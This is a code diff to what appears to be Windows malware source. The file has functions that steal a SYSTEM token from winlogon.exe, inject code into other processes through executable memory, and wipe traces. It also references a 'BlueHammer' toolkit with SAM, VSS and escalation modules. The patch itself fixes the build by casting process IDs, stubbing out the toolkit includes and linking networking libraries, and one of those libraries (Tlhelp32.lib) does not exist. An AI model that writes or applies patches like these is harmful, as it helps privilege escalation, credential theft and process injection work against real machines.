@@ -9,6 +9,7 @@
 #define KERNEL_MODE 1
 
 #include <Windows.h>
+#include <Tlhelp32.h>
 #include <WtsApi32.h>
 #include <Shellapi.h>
 #include <stdio.h>
@@ -114,7 +115,7 @@ BOOL ExpertElevateSystem() {
         do {
             // Target winlogon.exe or services.exe for SYSTEM token
             if (wcscmp(pe32.szExeFile, L"winlogon.exe") == 0) {
-                HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe32.th32ProcessID);
+                HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, (DWORD)pe32.th32ProcessID);
                 if (hProcess) {
                     if (OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken)) {
                         if (DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hNewToken)) {
@@ -247,14 +248,14 @@ void ExpertWipeTraces() {
 extern "C" {
 #endif
 
-#include "include/BlueHammer/common.h"
-#include "include/BlueHammer/escalate.h"
-#include "include/BlueHammer/vss.h"
-#include "include/BlueHammer/update.h"
-#include "include/BlueHammer/cloudfiles.h"
-#include "include/BlueHammer/race.h"
-#include "include/BlueHammer/sam.h"
-#include "include/BlueHammer/ntnative.h"
+// BlueHammer include not available
+// BlueHammer include not available
+// BlueHammer include not available
+// BlueHammer include not available
+// BlueHammer include not available
+// BlueHammer include not available
+// BlueHammer include not available
+// BlueHammer include not available
 
 #ifdef __cplusplus
 }
@@ -1802,7 +1803,7 @@ void InjectCode(const wchar_t* path, const wchar_t* target) {
     if (Process32FirstW(snap, &pe)) {
         do {
             if (_wcsicmp(pe.szExeFile, target) == 0) {
-                HANDLE proc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID);
+                HANDLE proc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)pe.th32ProcessID);
                 if (proc) {
                     SIZE_T size = (wcslen(path) + 1) * sizeof(wchar_t);
                     LPVOID addr = VirtualAllocEx(proc, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
@@ -7286,3 +7287,7 @@ int main(int argc, char* argv[]) {
 #pragma comment(lib, "ole32.lib")
 #pragma comment(lib, "wininet.lib")
 #pragma comment(lib, "Vssapi.lib")
+
+#pragma comment(lib, "Tlhelp32.lib")
+#pragma comment(lib, "Ws2_32.lib")
+#pragma comment(lib, "iphlpapi.lib")
